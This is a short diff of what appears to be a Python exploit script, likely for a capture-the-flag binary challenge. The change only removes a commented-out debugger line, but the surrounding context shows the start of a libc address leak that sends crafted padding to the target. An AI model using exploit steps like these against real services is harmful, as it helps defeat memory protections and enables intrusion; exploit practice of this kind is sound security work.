@@ -32,8 +32,6 @@ if len(sys.argv) > 2 and sys.argv[2] == 'test':
     sys.exit(0)
 ##########################################################
 
-# gdb.attach(p, 'fin\nfin\n')
-
 with log.progress('Leaking libc base address') as l:
     padding = 'AAAA' * 7
     p.sendafter(':', padding + 'A')
